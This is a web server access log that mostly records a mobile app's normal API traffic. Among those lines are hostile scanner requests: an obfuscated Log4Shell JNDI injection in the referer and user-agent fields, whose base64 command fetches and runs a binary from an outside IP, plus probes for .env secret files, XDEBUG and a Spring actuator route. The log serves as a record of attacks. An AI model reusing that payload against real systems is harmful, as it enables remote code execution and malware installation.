::ffff:127.0.0.1 - - [23/Sep/2022:00:32:28 +0000] "GET / HTTP/1.0" 404 139 "foobartest.com" "FooBarTest"
::1 - - [23/Sep/2022:00:34:33 +0000] "GET / HTTP/1.0" 404 139 "-" "Hello World"
::ffff:127.0.0.1 - - [23/Sep/2022:00:58:12 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY2htb2QgNzc3IGlkc2hhMWdhbWU7IC4vaWRzaGExZ2FtZSBydW5uZXI=}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY2htb2QgNzc3IGlkc2hhMWdhbWU7IC4vaWRzaGExZ2FtZSBydW5uZXI=}')"
::1 - - [23/Sep/2022:01:07:12 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:01:08:34 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [23/Sep/2022:01:08:34 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:01:25:11 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [23/Sep/2022:01:32:26 +0000] "GET /?Z75392122862Q1 HTTP/1.0" 404 139 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::ffff:127.0.0.1 - - [23/Sep/2022:02:02:24 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [23/Sep/2022:02:16:42 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [23/Sep/2022:02:18:30 +0000] "GET /ip.php?Z75392122862Q1 HTTP/1.0" 404 145 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::1 - - [23/Sep/2022:02:31:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:127.0.0.1 - - [23/Sep/2022:02:43:27 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [23/Sep/2022:02:57:58 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:02:57:58 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [23/Sep/2022:02:58:29 +0000] "GET /?Z75392122862Q1 HTTP/1.0" 404 139 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::ffff:127.0.0.1 - - [23/Sep/2022:03:08:13 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [23/Sep/2022:03:54:25 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:03:54:45 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [23/Sep/2022:03:54:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:04:09:18 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
::1 - - [23/Sep/2022:04:42:46 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:04:49:35 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [23/Sep/2022:05:07:19 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:05:07:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [23/Sep/2022:05:26:58 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [23/Sep/2022:05:58:45 +0000] "HEAD / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::1 - - [23/Sep/2022:06:03:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:03:47 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:03:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:03:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:03:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:03:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:03:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:03:52 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:03:53 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:03:53 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:04:28 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:04:49 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:06:12 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:07:06 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:07:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:07:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:07:07 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:07:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:07:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:08:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:08:29 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:08:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:09:10 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:09:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:09:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:09:15 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:10:12 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:10:17 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:10:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [23/Sep/2022:06:11:08 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 326 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:11:12 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:11:26 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:11:31 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:15:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:15:45 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:15:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:15:50 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 326 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:15:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:15:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:15:54 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:38 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:38 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:38 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:40 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 326 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:42 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [23/Sep/2022:06:16:42 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:47 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:48 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 326 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:16:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:16:49 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:17:34 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 326 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:18:05 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:18:08 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:18:16 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:18:16 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:18:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:18:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:18:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:18:21 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:18:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:18:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:20:25 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 339 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:20:28 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:22:16 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:22:16 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:22:32 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:23:04 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:23:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:23:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:23:06 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:23:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:23:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:26:04 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::1 - - [23/Sep/2022:06:31:37 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:31:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:31:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:31:51 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:31:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:31:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:31:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:31:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:31:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:31:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:32:45 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:32:45 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:33:03 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:33:03 +0000] "GET /api/v1/templates?createUser=632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:33:08 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:33:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:33:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:33:09 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:33:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:33:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:33:32 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [23/Sep/2022:06:33:52 +0000] "GET / HTTP/1.0" 404 139 "foobartest.com" "FooBarTest"
::1 - - [23/Sep/2022:06:35:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:35:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:35:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:35:08 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:35:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:35:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:40:42 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:40:44 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:06:40:48 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:06:40:51 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
